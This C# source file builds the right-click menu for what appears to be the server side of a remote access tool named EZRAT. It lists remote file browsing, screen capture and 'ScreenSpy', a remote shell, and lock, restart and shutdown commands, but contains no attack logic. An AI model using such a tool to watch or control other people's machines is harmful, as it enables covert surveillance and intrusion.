using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EZRATServer.Utils
{
    class ImageContextMenu : ContextMenuStrip
    {
        public ImageContextMenu()
        {
            ToolStripMenuItem menuFileBrowser = new ToolStripMenuItem("File Browser",new Bitmap(Properties.Resources.folder_64));
            ToolStripMenuItem menuChat = new ToolStripMenuItem("Chat",new Bitmap(Properties.Resources.chat_64));
            ToolStripMenuItem menuProcess = new ToolStripMenuItem("Process Viewer",new Bitmap(Properties.Resources.process_64));
            ToolStripMenuItem menuScreenShot = new ToolStripMenuItem("ScreenShot",new Bitmap(Properties.Resources.screenShot_100));
            ToolStripMenuItem menuMessageBox = new ToolStripMenuItem("MessageBox",new Bitmap(Properties.Resources.Form_64));
            ToolStripMenuItem menuScreenSPy = new ToolStripMenuItem("ScreenSpy",new Bitmap(Properties.Resources.screenshot_64));
            ToolStripMenuItem menuSysInfo = new ToolStripMenuItem("System Info",new Bitmap(Properties.Resources.computer_settings_64));
            ToolStripMenuItem menuSound = new ToolStripMenuItem("Play Sound",new Bitmap(Properties.Resources.sound));
            ToolStripMenuItem menuShell = new ToolStripMenuItem("Shell",new Bitmap(Properties.Resources.shell_48));
            ToolStripMenuItem menuClient = new ToolStripMenuItem("ClientControl",new Bitmap(Properties.Resources.clientControl_64));
            menuClient.DropDownItems.Add(new ToolStripMenuItem("Close",Properties.Resources.close_64));
            ToolStripMenuItem menuExecute = new ToolStripMenuItem("Execute", new Bitmap(Properties.Resources.UAC));
            menuExecute.DropDownItems.Add(new ToolStripMenuItem("Lock",Properties.Resources.locked));
            menuExecute.DropDownItems.Add(new ToolStripMenuItem("Restart",Properties.Resources.restart));
            menuExecute.DropDownItems.Add(new ToolStripMenuItem("Shutdown",Properties.Resources.shutdown));
            //ToolStripMenuItem menuMonitoring = new ToolStripMenuItem("ScreenShot",new Bitmap(Properties.Resources.monitor_64));
            this.CreateControl();
            this.Items.Add(menuFileBrowser);
            this.Items.Add(menuChat);
            this.Items.Add(menuProcess);
            this.Items.Add(menuScreenShot);
            this.Items.Add(menuScreenSPy);
            this.Items.Add(menuMessageBox);
            this.Items.Add(menuSysInfo);
            this.Items.Add(menuSound);
            this.Items.Add(menuShell);
            this.Items.Add(menuClient);
            this.Items.Add(menuExecute);
            //this.Items.Add(menuMonitoring);
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();

        }
    }
}
